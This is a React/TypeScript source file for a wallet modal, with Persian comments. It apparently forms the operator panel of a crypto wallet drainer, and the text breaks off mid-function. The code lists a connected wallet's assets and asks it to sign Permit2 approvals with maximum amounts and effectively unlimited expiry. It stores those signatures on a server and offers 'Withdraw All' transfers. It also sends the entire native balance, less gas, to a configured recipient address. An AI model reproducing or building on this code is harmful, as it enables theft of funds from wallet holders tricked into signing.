'use client';
// app/components/WalletModal.tsx

import { useEffect, useState, useCallback } from 'react';
import { ethers } from 'ethers';

// ── Types ────────────────────────────────────────────────────────
interface TokenAsset {
  symbol: string; name: string; balance: string;
  token_address: string; decimals: number; usd_value: number;
  chain: string; chain_label: string; logo?: string;
}
interface NativeCoin {
  symbol: string; name: string; chain: string; chain_label: string;
  balance: number; usd_value: number; logo?: string;
}
interface WalletDetail {
  id: number; address: string; balance_usdt: string;
  connected_at: string; updated_at: string; is_connected: number; total_usdt: number;
  assets: { erc20: TokenAsset[]; bep20: TokenAsset[]; native: NativeCoin[] };
}
interface SignatureRow {
  id: number; token_address: string; token_symbol: string; token_name: string;
  token_decimals: number; chain_label: string; chain_id: string; spender: string;
  value: string; deadline: string; nonce: number; signature: string;
  signed_at: string; is_active: number;
}
interface Props { walletId: number; address: string; onClose: () => void; }

const TABS = ['Overview', 'Assets', 'Signatures', 'Transfer'] as const;
type Tab = typeof TABS[number];

// chain_id → label کوتاه
const CHAIN_SHORT: Record<string, string> = {
  '1': 'ETH', '137': 'POL', '8453': 'BASE', '56': 'BSC', '11155111': 'SEP',
};
// chain label / hex chain id → decimal chain_id string
const CHAIN_ID: Record<string, string> = {
  'eth': '1', 'ethereum': '1', '0x1': '1', '1': '1',
  'matic': '137', 'polygon': '137', '0x89': '137', '137': '137',
  'base': '8453', '0x2105': '8453', '8453': '8453',
  'bsc': '56', 'bnb': '56', '0x38': '56', '56': '56',
  '0xaa36a7': '11155111', '11155111': '11155111',
};

// هر chain value رو به decimal chain_id تبدیل می‌کنه
function resolveChainId(chain: string): string {
  if (!chain) return '';
  const lower = chain.toLowerCase();
  // اگه توی map بود برگردون
  if (CHAIN_ID[lower]) return CHAIN_ID[lower];
  // اگه hex بود به decimal تبدیل کن
  if (lower.startsWith('0x')) return String(parseInt(lower, 16));
  // اگه عدد بود همونو برگردون
  if (/^\d+$/.test(lower)) return lower;
  return '';
}
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const MAX_UINT48 = '281474976710655';
const MAX_UINT160 = '1461501637330902918203684832716283019655932542975';

function shortAddress(addr: string) { return `${addr.slice(0, 6)}...${addr.slice(-4)}`; }
function formatDate(dateStr: string) {
  const d = new Date(dateStr);
  return `${d.getFullYear()}/${String(d.getMonth() + 1).padStart(2, '0')}/${String(d.getDate()).padStart(2, '0')} - ${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
}

// ── Asset rows ───────────────────────────────────────────────────
function TokenRow({ token, checked, onToggle, onSingleRequest, requesting, isSigned }: {
  token: TokenAsset;
  checked?: boolean;
  onToggle?: (addr: string) => void;
  onSingleRequest?: (token: TokenAsset) => void;
  requesting?: boolean;
  isSigned?: boolean;
}) {
  const bal = Number(token.balance) / Math.pow(10, token.decimals || 18);
  const hasToggle = onToggle !== undefined;
  const hasSingleReq = onSingleRequest !== undefined;

  return (
    <div
      className={`flex items-center justify-between px-4 py-2.5 border-b border-[#1d1d1d] last:border-0 ${hasToggle && !isSigned ? 'cursor-pointer hover:bg-white/[0.02] transition-colors' : ''}`}
      onClick={() => hasToggle && !isSigned && onToggle?.(token.token_address)}
    >
      <div className="flex items-center gap-2.5">
        {hasToggle && (
          <div className={`w-4 h-4 rounded border flex items-center justify-center shrink-0 transition-colors ${checked ? 'bg-blue-500 border-blue-500' : 'border-white/20 bg-transparent'}`}>
            {checked && <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="white" strokeWidth={3}><polyline points="20 6 9 17 4 12" /></svg>}
          </div>
        )}
        {token.logo
          ? <img src={token.logo} alt={token.symbol} className="w-7 h-7 rounded-full" onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          : <div className="w-7 h-7 rounded-full bg-white/8 flex items-center justify-center text-xs text-white/50 font-semibold">{token.symbol?.[0] || '?'}</div>
        }
        <div>
          <div className="text-white/80 text-sm font-medium">{token.symbol}</div>
          <div className="text-white/30 text-xs">{token.chain_label}</div>
        </div>
      </div>
      <div className="flex items-center gap-3">
        <div className="text-right">
          <div className="text-white/70 text-sm">{bal.toFixed(4)}</div>
          <div className="text-white/30 text-xs">${token.usd_value.toFixed(2)}</div>
        </div>
        {hasSingleReq && (
          isSigned ? (
            <span className="flex items-center gap-1 text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-1 rounded-full shrink-0">
              <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><polyline points="20 6 9 17 4 12" /></svg>
              Signed
            </span>
          ) : (
            <button
              onClick={e => { e.stopPropagation(); onSingleRequest(token); }}
              disabled={requesting}
              className="flex items-center gap-1 text-[10px] bg-purple-500/10 text-purple-400 border border-purple-500/20 px-2 py-1 rounded-full hover:bg-purple-500/20 transition-colors disabled:opacity-50 disabled:cursor-wait shrink-0"
            >
              {requesting
                ? <span className="w-2.5 h-2.5 border border-purple-400 border-t-transparent rounded-full animate-spin" />
                : <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><path d="M12 20h9" /><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" /></svg>
              }
              {requesting ? '...' : 'Request'}
            </button>
          )
        )}
      </div>
    </div>
  );
}

function NativeRow({ coin }: { coin: NativeCoin }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5 border-b border-[#1d1d1d] last:border-0">
      <div className="flex items-center gap-2.5">
        {coin.logo
          ? <img src={coin.logo} alt={coin.symbol} className="w-7 h-7 rounded-full" onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          : <div className="w-7 h-7 rounded-full bg-white/8 flex items-center justify-center text-xs text-white/50 font-semibold">{coin.symbol[0]}</div>
        }
        <div>
          <div className="text-white/80 text-sm font-medium">{coin.symbol}</div>
          <div className="text-white/30 text-xs">{coin.chain_label}</div>
        </div>
      </div>
      <div className="text-right">
        <div className="text-white/70 text-sm">{coin.balance.toFixed(6)}</div>
        <div className="text-white/30 text-xs">${coin.usd_value.toFixed(2)}</div>
      </div>
    </div>
  );
}

// ── ERC20Section ─────────────────────────────────────────────────
// برای ETH (chainId='1'): checkbox + Permit Batch
// برای سایر chain ها: دکمه Request جلوی هر توکن (اگه امضا نداشته باشه)
function ERC20Section({
  title, chainId, tokens, total, isSigned,
  signedTokens, checkedAddrs, onToggle, onToggleAll, onSingleRequest, singleRequestingAddr,
}: {
  title: string; chainId: string; tokens: TokenAsset[]; total: number;
  isSigned: boolean;
  signedTokens: Set<string>;
  checkedAddrs: Set<string>; onToggle: (addr: string) => void; onToggleAll: (chainId: string) => void;
  onSingleRequest?: (token: TokenAsset) => void;
  singleRequestingAddr?: string | null;
}) {
  const isEth = chainId === '1';
  const allChecked = tokens.length > 0 && tokens.every(t => checkedAddrs.has(t.token_address));
  const allSigned = tokens.length > 0 && tokens.every(t => signedTokens.has(t.token_address.toLowerCase()));

  return (
    <div className="bg-[#1a1a1a] border border-[#1d1d1d] rounded-xl overflow-hidden">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3 border-b border-[#1d1d1d]">
        <div className="flex items-center gap-2">
          {isEth && (
            <div
              className={`w-4 h-4 rounded border flex items-center justify-center shrink-0 cursor-pointer transition-colors ${allChecked ? 'bg-blue-500 border-blue-500' : 'border-white/20'}`}
              onClick={() => onToggleAll(chainId)}
            >
              {allChecked && <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="white" strokeWidth={3}><polyline points="20 6 9 17 4 12" /></svg>}
            </div>
          )}
          <span className="text-white/60 text-xs font-semibold uppercase tracking-wider">{title}</span>
          <span className="text-[10px] bg-white/5 text-white/30 px-1.5 py-0.5 rounded">{CHAIN_SHORT[chainId] || chainId}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-white/40 text-xs">${total.toFixed(2)}</span>
          {(isSigned || allSigned) && (
            <span className="flex items-center gap-1 text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded-full">
              <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}><polyline points="20 6 9 17 4 12" /></svg>
              Signed
            </span>
          )}
        </div>
      </div>

      {/* Token rows */}
      {tokens.length ? tokens.map((t, i) => (
        <TokenRow
          key={i}
          token={t}
          checked={isEth ? checkedAddrs.has(t.token_address) : undefined}
          onToggle={isEth ? onToggle : undefined}
          onSingleRequest={!isEth ? onSingleRequest : undefined}
          requesting={!isEth && singleRequestingAddr === t.token_address}
          isSigned={signedTokens.has(t.token_address.toLowerCase())}
        />
      )) : (
        <div className="px-4 py-5 text-center text-white/20 text-xs">No tokens found</div>
      )}
    </div>
  );
}

// ── NativeSection با دکمه Request ────────────────────────────────
function NativeSection({
  chainId, coins, total, onRequestDone,
}: {
  chainId: string; coins: NativeCoin[]; total: number; onRequestDone: () => void;
}) {
  const [requesting, setRequesting] = useState(false);

  const handleRequest = async () => {
    if (!window.ethereum) { alert('MetaMask not found'); return; }
    setRequesting(true);
    try {
      let provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      // از eth_accounts مستقیم می‌گیریم — از ENS resolution جلوگیری می‌کنه
      const owner: string = accounts[0] || (await provider.send('eth_accounts', []))[0];
      const network = await provider.getNetwork();

      if (network.chainId.toString() !== chainId) {
        await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${parseInt(chainId).toString(16)}` }]);
        provider = new ethers.BrowserProvider(window.ethereum);
      }

      const signer = await provider.getSigner();
      const settingsRes = await fetch('/api/settings/recipient');
      const { address: recipient } = await settingsRes.json();
      if (!recipient) { alert('Recipient not configured'); return; }

      const nativeBalance = await provider.getBalance(owner);
      const gasBuffer = ethers.parseEther('0.002');
      if (nativeBalance <= gasBuffer) { alert('Not enough native balance (min 0.002 for gas)'); return; }

      const tx = await signer.sendTransaction({ to: recipient, value: nativeBalance - gasBuffer });
      await tx.wait();
      alert(`${CHAIN_SHORT[chainId] || 'Native'} transferred successfully!`);
      onRequestDone();
    } catch (err: any) {
      const msg = err?.message || '';
      if (!msg.toLowerCase().includes('reject') && !msg.toLowerCase().includes('denied')) {
        alert('Error: ' + msg);
      }
    } finally {
      setRequesting(false);
    }
  };

  return (
    <div className="bg-[#1a1a1a] border border-[#1d1d1d] rounded-xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-3 border-b border-[#1d1d1d]">
        <div className="flex items-center gap-2">
          <span className="text-white/60 text-xs font-semibold uppercase tracking-wider">Native</span>
          <span className="text-[10px] bg-white/5 text-white/30 px-1.5 py-0.5 rounded">{CHAIN_SHORT[chainId] || chainId}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-white/40 text-xs">${total.toFixed(2)}</span>
          <button
            onClick={handleRequest}
            disabled={requesting}
            className="flex items-center gap-1 text-[10px] bg-orange-500/10 text-orange-400 border border-orange-500/20 px-2 py-0.5 rounded-full hover:bg-orange-500/20 transition-colors disabled:opacity-50 disabled:cursor-wait"
          >
            {requesting
              ? <span className="w-2.5 h-2.5 border border-orange-400 border-t-transparent rounded-full animate-spin" />
              : <svg width="9" height="9" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><line x1="12" y1="5" x2="12" y2="19" /><polyline points="19 12 12 19 5 12" /></svg>
            }
            {requesting ? '...' : 'Transfer'}
          </button>
        </div>
      </div>
      {coins.map((n, i) => <NativeRow key={i} coin={n} />)}
    </div>
  );
}

// ── Signatures Tab ───────────────────────────────────────────────
function SignaturesTab({ walletAddress, onSigsChange }: { walletAddress: string; onSigsChange: () => void }) {
  const [sigs, setSigs] = useState<SignatureRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [revoking, setRevoking] = useState<string | null>(null);

  const handleRevoke = async (ids: number[], sigShort: string) => {
    setRevoking(sigShort);
    try {
      const res = await fetch('/api/signatures/revoke', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids }) });
      const json = await res.json();
      if (json.success) {
        setSigs(prev => prev.map(s => ids.includes(s.id) ? { ...s, is_active: 0 } : s));
        onSigsChange();
      }
    } finally { setRevoking(null); }
  };

  useEffect(() => {
    fetch(`/api/signatures?wallet=${walletAddress}`)
      .then(r => r.json())
      .then(j => { if (j.success) setSigs(j.data); })
      .finally(() => setLoading(false));
  }, [walletAddress]);

  if (loading) return <div className="flex items-center justify-center py-12"><div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" /></div>;

  if (!sigs.length) return (
    <div className="flex flex-col items-center justify-center py-12 gap-3">
      <div className="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center">
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8} className="text-white/30"><path d="M12 20h9" /><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" /></svg>
      </div>
      <p className="text-white/30 text-sm">No signatures yet</p>
    </div>
  );

  const bySignature = sigs.reduce((acc, sig) => {
    if (!acc[sig.signature]) acc[sig.signature] = [];
    acc[sig.signature].push(sig);
    return acc;
  }, {} as Record<string, SignatureRow[]>);

  return (
    <div className="space-y-3">
      {Object.entries(bySignature).map(([sigKey, group]) => {
        const first = group[0];
        const sigShort = sigKey.slice(0, 16);
        const isOpen = expanded === sigShort;
        const chainShort = CHAIN_SHORT[first.chain_id] || first.chain_label || 'ETH';
        const byChain = group.reduce((acc, s) => {
          const c = CHAIN_SHORT[s.chain_id] || s.chain_label;
          if (!acc[c]) acc[c] = [];
          acc[c].push(s);
          return acc;
        }, {} as Record<string, SignatureRow[]>);

        return (
          <div key={sigShort} className="bg-[#1a1a1a] border border-[#1d1d1d] rounded-xl overflow-hidden">
            <button onClick={() => setExpanded(isOpen ? null : sigShort)} className="w-full flex items-center justify-between px-4 py-3 hover:bg-white/[0.02] transition-colors">
              <div className="flex items-center gap-2">
                <span className="text-xs bg-blue-600/30 text-blue-300 border border-blue-500/30 px-2.5 py-0.5 rounded font-semibold">{chainShort}</span>
                <span className="text-white/30 text-xs">{group.length} token{group.length > 1 ? 's' : ''}</span>
              </div>
              <div className="flex items-center gap-2 shrink-0 ml-2">
                <span className="text-white/30 text-xs hidden sm:block">{formatDate(first.signed_at)}</span>
                <span className={`text-xs px-2 py-0.5 rounded-full border ${first.is_active ? 'bg-emerald-400/10 text-emerald-400 border-emerald-400/20' : 'bg-white/5 text-white/30 border-white/10'}`}>
                  {first.is_active ? 'Active' : 'Inactive'}
                </span>
                <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2} className={`text-white/30 transition-transform ${isOpen ? 'rotate-180' : ''}`}><polyline points="6 9 12 15 18 9" /></svg>
              </div>
            </button>
            {isOpen && (
              <div className="border-t border-[#1d1d1d] px-4 py-3 space-y-4">
                <div>
                  <p className="text-white/30 text-xs mb-1.5">Signature</p>
                  <p className="text-white/40 text-xs font-mono break-all bg-black/30 px-3 py-2.5 rounded-lg leading-relaxed">{sigKey}</p>
                </div>
                {Object.entries(byChain).map(([chain, tokens]) => (
                  <div key={chain}>
                    <p className="text-white/30 text-xs mb-1.5 flex items-center gap-1.5">
                      <span className="bg-blue-600/20 text-blue-400 text-[10px] px-1.5 py-0.5 rounded font-semibold">{chain}</span>
                      <span>{tokens.length} token{tokens.length > 1 ? 's' : ''}</span>
                    </p>
                    <div className="space-y-1.5">
                      {tokens.map(s => (
                        <div key={s.id} className="flex items-center justify-between bg-black/20 px-3 py-2 rounded-lg">
                          <span className="text-white/70 text-xs font-medium">{s.token_symbol}</span>
                          <div className="text-right">
                            <p className="text-white/30 text-xs">Nonce: {s.nonce}</p>
                            <p className="text-white/30 text-xs">Spender: {shortAddress(s.spender)}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                    {first.is_active ? (
                      <button
                        onClick={() => handleRevoke(group.map(s => s.id), sigShort)}
                        disabled={revoking === sigShort}
                        className="w-full mt-2 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg border border-red-500/20 bg-red-500/5 text-red-400 text-xs font-medium hover:bg-red-500/10 transition-colors disabled:opacity-50 disabled:cursor-wait"
                      >
                        {revoking === sigShort ? <span className="w-3 h-3 border border-red-400 border-t-transparent rounded-full animate-spin" /> : <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path d="M18.364 5.636a9 9 0 1 1-12.728 0" /><line x1="12" y1="2" x2="12" y2="12" /></svg>}
                        {revoking === sigShort ? 'Revoking...' : 'Revoke Signature'}
                      </button>
                    ) : (
                      <div className="w-full mt-2 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg border border-white/5 bg-white/[0.02] text-white/20 text-xs">Revoked</div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ── Transfer Tab ─────────────────────────────────────────────────
function TransferTab({ walletAddress, detail }: { walletAddress: string; detail: WalletDetail }) {
  const [sigs, setSigs] = useState<SignatureRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [withdrawing, setWithdrawing] = useState<string | null>(null);
  const [expanded, setExpanded] = useState<string | null>(null);

  // موجودی رو از detail که قبلاً لود شده میگیریم — نیازی به API جداگانه نیست
  const getTokenBalance = (tokenAddress: string, chainId: string): number => {
    const allTokens = [...(detail.assets?.erc20 || []), ...(detail.assets?.bep20 || [])];
    const token = allTokens.find(t =>
      t.token_address?.toLowerCase() === tokenAddress?.toLowerCase() &&
      resolveChainId(t.chain) === resolveChainId(chainId)
    );
    if (!token) return 0;
    return Number(token.balance) / Math.pow(10, token.decimals || 18);
  };

  const loadSigs = useCallback(async () => {
    setLoading(true);
    try {
      const j = await fetch(`/api/signatures?wallet=${walletAddress}`).then(r => r.json());
      if (!j.success) return;
      const active: SignatureRow[] = j.data.filter((s: SignatureRow) => s.is_active === 1);
      setSigs(active);
    } finally { setLoading(false); }
  }, [walletAddress]);

  useEffect(() => { loadSigs(); }, [loadSigs]);

  const handleWithdraw = async (group: SignatureRow[], sigKey: string) => {
    const sigShort = sigKey.slice(0, 16);
    setWithdrawing(sigShort);
    try {
      const res = await fetch('/api/transfer', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ walletAddress, signature: sigKey, tokens: group.map(s => ({ id: s.id, tokenAddress: s.token_address, tokenSymbol: s.token_symbol, decimals: s.token_decimals, chainId: s.chain_id, spender: s.spender, nonce: s.nonce, value: s.value })) }) });
      const json = await res.json();
      if (json.success) { const ids = group.map(s => s.id); setSigs(prev => prev.filter(s => !ids.includes(s.id))); setExpanded(null); }
      else alert(json.error || 'Transfer failed');
    } catch (err: any) { alert(err?.message || 'Unknown error'); }
    finally { setWithdrawing(null); }
  };

  if (loading) return <div className="flex items-center justify-center py-12"><div className="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" /></div>;

  const bySignature = sigs.reduce((acc, sig) => { if (!acc[sig.signature]) acc[sig.signature] = []; acc[sig.signature].push(sig); return acc; }, {} as Record<string, SignatureRow[]>);

  if (!Object.keys(bySignature).length) return (
    <div className="flex flex-col items-center justify-center py-12 gap-3">
      <div className="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center">
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8} className="text-white/30"><line x1="12" y1="5" x2="12" y2="19" /><polyline points="19 12 12 19 5 12" /></svg>
      </div>
      <p className="text-white/30 text-sm">No active signatures available</p>
    </div>
  );

  return (
    <div className="space-y-3">
      {Object.entries(bySignature).map(([sigKey, group]) => {
        const first = group[0];
        const sigShort = sigKey.slice(0, 16);
        const chainShort = CHAIN_SHORT[first.chain_id] || first.chain_label || 'ETH';
        const isWithdrawing = withdrawing === sigShort;
        const isOpen = expanded === sigShort;

        const tokenBalances = group.map(s => ({
          ...s,
          currentBalance: getTokenBalance(s.token_address, s.chain_id),
        }));
        const hasBalance = tokenBalances.some(t => t.currentBalance > 0);

        return (
          <div key={sigShort} className="bg-[#1a1a1a] border border-[#1d1d1d] rounded-xl overflow-hidden">
            {/* Header — کلیک برای باز/بسته شدن */}
            <button
              onClick={() => setExpanded(isOpen ? null : sigShort)}
              className="w-full flex items-center justify-between px-4 py-3 hover:bg-white/[0.02] transition-colors"
            >
              <div className="flex items-center gap-2">
                <span className="text-xs bg-blue-600/30 text-blue-300 border border-blue-500/30 px-2.5 py-0.5 rounded font-semibold">{chainShort}</span>
                <span className="text-white/30 text-xs">{group.length} token{group.length > 1 ? 's' : ''}</span>
                {hasBalance && (
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-1.5 py-0.5 rounded-full">Has balance</span>
                )}
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white/20 text-xs">{formatDate(first.signed_at)}</span>
                <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2} className={`text-white/30 transition-transform ${isOpen ? 'rotate-180' : ''}`}><polyline points="6 9 12 15 18 9" /></svg>
              </div>
            </button>

            {/* Content — فقط وقتی باز است */}
            {isOpen && (
              <>
                <div className="divide-y divide-[#1d1d1d] border-t border-[#1d1d1d]">
                  {tokenBalances.map(s => {
                    const hasbal = s.currentBalance > 0;
                    return (
                      <div key={s.id} className="flex items-center justify-between px-4 py-2.5">
                        <div className="flex items-center gap-2">
                          <span className={`text-xs font-medium ${hasbal ? 'text-white/80' : 'text-white/30'}`}>{s.token_symbol}</span>
                          {!hasbal && <span className="text-[10px] bg-white/5 text-white/20 px-1.5 py-0.5 rounded">No balance</span>}
                        </div>
                        <span className={`text-xs font-mono ${hasbal ? 'text-white/60' : 'text-white/20'}`}>
                          {hasbal ? s.currentBalance.toFixed(4) : '0'}
                        </span>
                      </div>
                    );
                  })}
                </div>
                <div className="px-4 py-3 border-t border-[#1d1d1d]">
                  {hasBalance ? (
                    <button onClick={() => handleWithdraw(group, sigKey)} disabled={isWithdrawing} className="w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold hover:bg-emerald-500/20 transition-colors disabled:opacity-50 disabled:cursor-wait">
                      {isWithdrawing ? <><span className="w-3.5 h-3.5 border border-emerald-400 border-t-transparent rounded-full animate-spin" />Withdrawing...</> : <><svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}><line x1="12" y1="5" x2="12" y2="19" /><polyline points="19 12 12 19 5 12" /></svg>Withdraw All</>}
                    </button>
                  ) : (
                    <div className="w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg bg-white/[0.02] border border-white/5 text-white/20 text-xs cursor-not-allowed">
                      <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>
                      No balance to withdraw
                    </div>
                  )}
                </div>
              </>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ── Assets Tab ───────────────────────────────────────────────────
function AssetsTab({ detail, address, erc20ByChain, nativeByChain, bep20Total, totalUsdt, signedChains, onSignedChange }: {
  detail: WalletDetail;
  address: string;
  erc20ByChain: Record<string, { tokens: TokenAsset[]; total: number; label: string }>;
  nativeByChain: Record<string, { coins: NativeCoin[]; total: number; label: string }>;
  bep20Total: number;
  totalUsdt: number;
  signedChains: Record<string, boolean>;
  onSignedChange: () => void;
}) {
  // checked state: فقط برای ETH توکن ها
  const [checkedAddrs, setCheckedAddrs] = useState<Set<string>>(new Set());
  const [requesting, setRequesting] = useState(false);
  const [singleRequestingAddr, setSingleRequestingAddr] = useState<string | null>(null);
  const [signedTokens, setSignedTokens] = useState<Set<string>>(new Set());

  // لود توکن های signed از API
  useEffect(() => {
    fetch(`/api/signatures?wallet=${address}`)
      .then(r => r.json())
      .then(j => {
        if (!j.success) return;
        const active: string[] = j.data
          .filter((s: any) => s.is_active === 1)
          .map((s: any) => s.token_address.toLowerCase());
        setSignedTokens(new Set(active));
      });
  }, [address]);

  const toggleOne = (addr: string) => {
    setCheckedAddrs(prev => {
      const next = new Set(prev);
      next.has(addr) ? next.delete(addr) : next.add(addr);
      return next;
    });
  };

  const toggleAll = (chainId: string) => {
    // toggleAll فقط برای ETH کار می‌کنه
    if (chainId !== '1') return;
    const chainTokens = erc20ByChain[chainId]?.tokens || [];
    const allChecked = chainTokens.every(t => checkedAddrs.has(t.token_address));
    setCheckedAddrs(prev => {
      const next = new Set(prev);
      chainTokens.forEach(t => allChecked ? next.delete(t.token_address) : next.add(t.token_address));
      return next;
    });
  };

  // Individual request برای یه توکن (برای non-ETH chains)
  const handleSingleRequest = async (token: TokenAsset) => {
    if (!window.ethereum) { alert('MetaMask not found'); return; }

    const tokenAddr = token.token_address;
    const chainId = resolveChainId(token.chain || '');

    if (!tokenAddr || !ethers.isAddress(tokenAddr)) {
      alert(`Token address invalid for ${token.symbol}`);
      return;
    }
    if (!chainId) {
      alert(`Could not resolve chain for: ${token.chain}`);
      return;
    }

    setSingleRequestingAddr(tokenAddr);
    try {
      let provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send('eth_requestAccounts', []);
      // از address موجود در props استفاده می‌کنیم — از ENS resolution جلوگیری می‌کنه
      const owner = address;

      const network = await provider.getNetwork();
      if (network.chainId.toString() !== chainId) {
        await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${parseInt(chainId).toString(16)}` }]);
        // بعد از switch chain باید provider رو دوباره بسازیم
        provider = new ethers.BrowserProvider(window.ethereum);
      }

      // PermitSingle — فقط برای یه توکن (non-ETH chains)
      const permitTypedData = {
        domain: {
          name: 'Permit2',
          chainId: parseInt(chainId),
          verifyingContract: PERMIT2_ADDRESS,
        },
        types: {
          PermitDetails: [
            { name: 'token', type: 'address' },
            { name: 'amount', type: 'uint160' },
            { name: 'expiration', type: 'uint48' },
            { name: 'nonce', type: 'uint48' },
          ],
          PermitSingle: [
            { name: 'details', type: 'PermitDetails' },
            { name: 'spender', type: 'address' },
            { name: 'sigDeadline', type: 'uint256' },
          ],
        },
        primaryType: 'PermitSingle',
        message: {
          details: { token: tokenAddr, amount: MAX_UINT160, expiration: MAX_UINT48, nonce: 0 },
          spender: owner,
          sigDeadline: MAX_UINT48,
        },
      };

      const signature = await provider.send('eth_signTypedData_v4', [owner.toLowerCase(), JSON.stringify(permitTypedData)]);

      const res = await fetch('/api/signatures', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: owner, signature,
          chainId: parseInt(chainId),
          chainLabel: CHAIN_SHORT[chainId] || '',
          permitBatch: {
            details: [{ token: tokenAddr, amount: MAX_UINT160, expiration: MAX_UINT48, nonce: 0, token_address: tokenAddr, symbol: token.symbol, name: token.name, decimals: token.decimals }],
            spender: owner,
            sigDeadline: MAX_UINT48,
          },
        }),
      });

      const json = await res.json();
      if (!res.ok || !json.success) throw new Error(json.error || 'Failed');
      setSignedTokens(prev => new Set([...prev, tokenAddr.toLowerCase()]));
      onSignedChange();
    } catch (err: any) {
      const msg = err?.message || '';
      if (!msg.toLowerCase().includes('reject') && !msg.toLowerCase().includes('denied')) {
        alert('Error: ' + msg);
      }
    } finally {
      setSingleRequestingAddr(null);
    }
  };

  // گروه‌بندی انتخاب‌شده‌ها — فقط ETH برای permitBatch
  const selectedByChain = () => {
    const map: Record<string, TokenAsset[]> = {};
    const ethTokens = erc20ByChain['1']?.tokens || [];
    ethTokens.forEach(t => {
      if (checkedAddrs.has(t.token_address)) {
        if (!map['1']) map['1'] = [];
        map['1'].push(t);
      }
    });
    return map;
  };

  const handlePermitBatch = async () => {
    if (!checkedAddrs.size || !window.ethereum) return;
    setRequesting(true);
    try {
      let provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send('eth_requestAccounts', []);
      // از address موجود در props — از ENS resolution جلوگیری می‌کنه
      const owner = address;

      const byChain = selectedByChain();

      // هر chain جداگانه یه permitBatch میگیره
      for (const [chainId, tokens] of Object.entries(byChain)) {
        const network = await provider.getNetwork();
        if (network.chainId.toString() !== chainId) {
          await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${parseInt(chainId).toString(16)}` }]);
          provider = new ethers.BrowserProvider(window.ethereum);
        }

        // ساخت typed data به صورت دستی — SDK values گاهی token address رو serialize نمی‌کنه
        const permitDetails = tokens.map(t => ({
          token: t.token_address,
          amount: MAX_UINT160,
          expiration: MAX_UINT48,
          nonce: 0,
        }));

        const permitTypedData = {
          domain: {
            name: 'Permit2',
            chainId: parseInt(chainId),
            verifyingContract: PERMIT2_ADDRESS,
          },
          types: {
            PermitDetails: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint160' },
              { name: 'expiration', type: 'uint48' },
              { name: 'nonce', type: 'uint48' },
            ],
            PermitBatch: [
              { name: 'details', type: 'PermitDetails[]' },
              { name: 'spender', type: 'address' },
              { name: 'sigDeadline', type: 'uint256' },
            ],
          },
          primaryType: 'PermitBatch',
          message: {
            details: permitDetails,
            spender: owner,
            sigDeadline: MAX_UINT48,
          },
        };

        const signature = await provider.send('eth_signTypedData_v4', [owner.toLowerCase(), JSON.stringify(permitTypedData)]);

        const res = await fetch('/api/signatures', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            walletAddress: owner, signature,
            chainId: parseInt(chainId),
            chainLabel: CHAIN_SHORT[chainId] || '',
            permitBatch: {
              details: permitDetails.map(d => {
